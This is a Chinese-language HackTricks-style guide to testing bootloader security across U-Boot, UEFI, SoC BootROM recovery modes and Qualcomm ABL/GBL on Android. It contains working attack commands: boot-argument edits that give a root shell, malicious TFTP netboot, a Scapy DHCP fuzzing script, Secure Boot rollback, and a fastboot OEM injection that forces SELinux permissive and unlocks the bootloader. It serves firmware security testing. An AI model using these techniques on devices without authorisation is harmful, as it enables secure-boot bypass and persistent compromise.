# Bootloader 测试

{{#include ../../banners/hacktricks-training.md}}

以下步骤建议用于修改设备启动配置并测试诸如 U-Boot 和 UEFI 类加载器的 bootloader。重点是获取早期代码执行、评估签名/回滚保护，以及滥用恢复或网络引导路径。

Related: MediaTek secure-boot bypass via bl2_ext patching:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## U-Boot 速成技巧与环境滥用

1. 访问解释器 shell
- 在启动过程中，在 `bootcmd` 执行之前按已知的中断键（通常是任意键、0、空格，或板子特定的 "magic" 序列）以进入 U-Boot 提示符。

2. 检查启动状态和变量
- 常用命令：
- `printenv` (dump environment)
- `bdinfo` (board info, memory addresses)
- `help bootm; help booti; help bootz` (supported kernel boot methods)
- `help ext4load; help fatload; help tftpboot` (available loaders)

3. 修改启动参数以获取 root shell
- 追加 `init=/bin/sh` 使内核在启动时进入 shell 而不是正常 init：
```
# printenv
# setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
# saveenv
# boot    # or: run bootcmd
```

4. 从你的 TFTP 服务器进行 netboot
- 配置网络并从 LAN 获取 kernel/fit 镜像：
```
# setenv ipaddr 192.168.2.2      # device IP
# setenv serverip 192.168.2.1    # TFTP server IP
# saveenv; reset
# ping ${serverip}
# tftpboot ${loadaddr} zImage           # kernel
# tftpboot ${fdt_addr_r} devicetree.dtb # DTB
# setenv bootargs "${bootargs} init=/bin/sh"
# booti ${loadaddr} - ${fdt_addr_r}
```

5. 通过 environment 保持更改
- 如果 env 存储没有被写保护，你可以持久化控制：
```
# setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
# saveenv
```
- 检查诸如 `bootcount`、`bootlimit`、`altbootcmd`、`boot_targets` 等变量，它们影响回退路径。配置不当的值可能会反复让你中断进入 shell。

6. 检查调试/不安全功能
- 查找：`bootdelay` > 0、`autoboot` 被禁用、无限制的 `usb start; fatload usb 0:1 ...`、可以通过串口使用 `loady`/`loads`、从不受信任介质执行 `env import`、以及加载内核/ramdisk 时不做签名检查的能力。

7. U-Boot 镜像/验证测试
- 如果平台声称对 FIT 镜像做了 secure/verified boot，尝试 unsigned 和 被篡改的镜像：
```
# tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
# tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
# tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
```
- 缺少 `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` 或遗留的 `verify=n` 行为通常允许引导任意 payload。

## 网络引导面 (DHCP/PXE) 与 恶意服务器

8. PXE/DHCP 参数模糊测试
- U-Boot 的旧版 BOOTP/DHCP 处理存在内存安全问题。例如，CVE‑2024‑42040 描述通过精心构造的 DHCP 响应将 U-Boot 内存的字节 leak 回线上的内存泄露问题。对 DHCP/PXE 代码路径使用超长/边界值参数（option 67 bootfile-name、vendor options、file/servername 字段）进行测试，观察是否有挂起或 leak 现象。
- 用于在 netboot 期间压测引导参数的最小 Scapy 片段：
```python
from scapy.all import *
offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
IP(src='192.168.2.1', dst='255.255.255.255')/
UDP(sport=67, dport=68)/
BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
DHCP(options=[('message-type','offer'),
('server_id','192.168.2.1'),
# Intentionally oversized and strange values
('bootfile_name','A'*300),
('vendor_class_id','B'*240),
'end']))
sendp(offer, iface='eth0', loop=1, inter=0.2)
```
- 还要验证当链到 OS 侧的配置脚本时，PXE 文件名字段是否在传递给 shell/loader 逻辑前未做消毒。

9. 恶意 DHCP 服务器命令注入测试
- 搭建一个恶意的 DHCP/PXE 服务，尝试在 filename 或 options 字段中注入字符，以在引导链后续阶段触及命令解释器。Metasploit 的 DHCP auxiliary、`dnsmasq` 或自定义 Scapy 脚本都很适合。先确保将实验室网络隔离。

## 覆盖正常引导的 SoC ROM 恢复模式

许多 SoC 暴露一个 BootROM "loader" 模式，即使 flash 镜像无效也会接受通过 USB/UART 发送的代码。如果 secure-boot 的 eFuses/OTP 没有烧录，这通常能在链的非常早期提供任意代码执行。

- NXP i.MX (Serial Download Mode)
- Tools: `uuu` (mfgtools3) or `imx-usb-loader`.
- 示例: `imx-usb-loader u-boot.imx` 将自定义 U-Boot 推送并在 RAM 中运行。
- Allwinner (FEL)
- Tool: `sunxi-fel`.
- 示例: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` 或 `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
- Tool: `rkdeveloptool`.
- 示例: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` 用于分阶段加载 loader 并上传自定义 U-Boot。

评估设备是否已烧录 secure-boot eFuses/OTP。如果没有，BootROM 下载模式通常会绕过任何更高层的验证（U-Boot、kernel、rootfs），直接从 SRAM/DRAM 执行你的第一阶段 payload。

## UEFI/PC 类 bootloader：快速检查

10. ESP 篡改与回滚测试
- 挂载 EFI System Partition (ESP) 并检查 loader 组件：`EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, 厂商 logo 路径等。
- 如果 Secure Boot 的撤销列表（dbx）不是最新，尝试使用降级或已知有漏洞的已签名启动组件进行引导。如果平台仍信任旧的 shim/bootmanagers，通常可以从 ESP 加载你自己的 kernel 或 `grub.cfg` 来获得持久化。

11. 启动 logo 解析漏洞（LogoFAIL 类）
- 若干 OEM/IBV 固件在处理启动 logo 的 DXE 阶段存在图像解析缺陷。如果攻击者能在 ESP 的厂商特定路径（例如 `\EFI\<vendor>\logo\*.bmp`）放置特制图像并重启，即使在启用了 Secure Boot 的情况下也可能在早期引导时触发代码执行。测试平台是否接受用户提供的 logo，以及这些路径是否可从 OS 写入。

## Android/Qualcomm ABL + GBL (Android 16) 信任缺口

在使用 Qualcomm 的 ABL 加载 Generic Bootloader Library (GBL) 的 Android 16 设备上，验证 ABL 是否对其从 `efisp` 加载的 UEFI app 执行认证。如果 ABL 只检查 UEFI app 的存在而不验证签名，那么对 `efisp` 的写入原语就会在启动时成为 pre-OS 未签名代码执行 的通道。

实用检查和滥用路径：

- efisp write primitive：你需要一种方法将自定义 UEFI app 写入 `efisp`（root/特权服务、OEM 应用漏洞、recovery/fastboot 路径）。没有这个能力，GBL 加载缺口就无法直接利用。
- fastboot OEM 参数注入（ABL 漏洞）：某些构建会接受 `fastboot oem set-gpu-preemption` 的额外 token 并将它们追加到 kernel cmdline。这可用于强制 SELinux 为 permissive，从而允许写入受保护分区：
```bash
fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
```
如果设备已打补丁，该命令应拒绝额外参数。
- 通过持久标志解锁 bootloader：一个 boot-stage payload 可以翻转持久解锁标志（例如 `is_unlocked=1`、`is_unlocked_critical=1`）以模拟 `fastboot oem unlock`，而无需 OEM 服务器/批准门槛。下次重启后这是持久的状态变化。

防御/分级说明：

- 确认 ABL 是否对从 `efisp` 获取的 GBL/UEFI payload 执行签名验证。如果没有，应将 `efisp` 视为高风险的持久化表面。
- 跟踪 ABL fastboot OEM 处理程序是否已修补以验证参数数量并拒绝额外 token。

## 硬件注意事项

在早期启动期间与 SPI/NAND flash 交互（例如通过接地引脚以绕过读取）时要小心，并始终参考 flash 数据手册。时机不当的短接可能会破坏设备或编程器。

## 备注与附加提示

- 尝试 `env export -t ${loadaddr}` 和 `env import -t ${loadaddr}` 在 RAM 和 存储间移动 environment blob；一些平台允许从可移动介质导入 env 而不做认证。
- 对于通过 `extlinux.conf` 引导的基于 Linux 的系统，修改 boot 分区上的 `APPEND` 行（注入 `init=/bin/sh` 或 `rd.break`）通常足够，前提是没有强制签名检查。
- 如果用户态提供 `fw_printenv/fw_setenv`，验证 `/etc/fw_env.config` 是否匹配真实的 env 存储。配置错误的偏移会让你读/写错误的 MTD 区域。

## References

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [https://nvd.nist.gov/vuln/detail/CVE-2024-42040](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)
- [https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/](https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/)
- [https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html](https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html)
- [https://source.android.com/docs/core/architecture/bootloader/generic-bootloader](https://source.android.com/docs/core/architecture/bootloader/generic-bootloader)
- [https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab)
- [https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2)
{{#include ../../banners/hacktricks-training.md}}
